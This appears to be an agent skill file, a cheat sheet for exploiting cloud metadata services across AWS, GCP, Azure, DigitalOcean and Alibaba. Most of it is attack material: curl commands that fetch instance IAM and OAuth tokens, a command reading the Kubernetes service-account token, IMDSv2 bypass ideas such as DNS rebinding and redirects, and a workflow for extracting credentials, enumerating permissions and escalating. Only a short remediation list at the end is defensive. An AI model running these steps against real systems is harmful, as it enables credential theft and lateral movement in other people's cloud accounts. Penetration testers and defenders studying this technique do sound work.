---
name: cloud_metadata
description: Cross-cloud metadata service exploitation and credential extraction
---

# Cloud Metadata Services

## Attack Surface

- All major cloud providers expose metadata APIs on link-local addresses
- Metadata services return instance credentials, network config, and user data
- SSRF vulnerabilities in web apps provide direct access to metadata endpoints
- Container environments (ECS, GKE, ACI) have their own metadata endpoints
- Credential extraction from metadata enables lateral movement across cloud services

## Provider Metadata Endpoints

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (token required)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# ECS container credentials
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### GCP
```
# Requires Metadata-Flavor: Google header
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

# Alternative IP
http://169.254.169.254/computeMetadata/v1/
```

### Azure
```
# Requires Metadata: true header
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
http://169.254.169.254/metadata/v1/user-data
```

### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>
```

## Header Requirements

```
AWS IMDSv1:  No special headers required
AWS IMDSv2:  X-aws-ec2-metadata-token: <token> (obtained via PUT)
GCP:         Metadata-Flavor: Google
Azure:       Metadata: true
```

## IMDSv2 Bypass Techniques

```bash
# DNS rebinding: resolve attacker domain to 169.254.169.254
# Bypasses IMDSv2 hop limit (TTL=1) since DNS resolution is local

# SSRF via server-side redirect (PUT token request may succeed)
# Step 1: GET to attacker server that 302 redirects to metadata
# Step 2: Some HTTP clients follow redirects with method change

# Container escape: IMDSv2 hop limit does not apply within same network namespace
# ECS tasks on bridge mode can reach IMDS if hop limit misconfigured

# IPv6 equivalent (if enabled)
http://[fd00:ec2::254]/latest/meta-data/
```

## Container Metadata Endpoints

```bash
# AWS ECS task metadata
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl $ECS_CONTAINER_METADATA_URI_V4/task

# GKE pod metadata (via node metadata)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure Container Instance
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Kubernetes service account token (all providers)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## Credential Extraction Workflow

```
1. Identify cloud provider
   - Check response headers, error pages, DNS records
   - Try each metadata endpoint in sequence

2. Retrieve credentials
   - AWS: AccessKeyId + SecretAccessKey + Token from security-credentials
   - GCP: OAuth access_token from service-accounts/default/token
   - Azure: access_token from identity/oauth2/token

3. Validate and enumerate permissions
   - AWS: aws sts get-caller-identity
   - GCP: curl -H "Authorization: Bearer <token>" https://www.googleapis.com/oauth2/v1/tokeninfo
   - Azure: az account show (after setting token)

4. Escalate
   - List attached roles/policies
   - Attempt cross-service access (storage, secrets, databases)
```

## Remediation

- AWS: enforce IMDSv2 with `HttpTokens: required` and set hop limit to 1
- GCP: use Workload Identity; restrict metadata access via firewall rules
- Azure: use user-assigned managed identities with minimal RBAC
- All providers: block outbound traffic to 169.254.169.254 from application containers
- Use network policies to restrict metadata access to only pods/instances that need it
- Monitor cloud audit logs for unusual metadata API access patterns
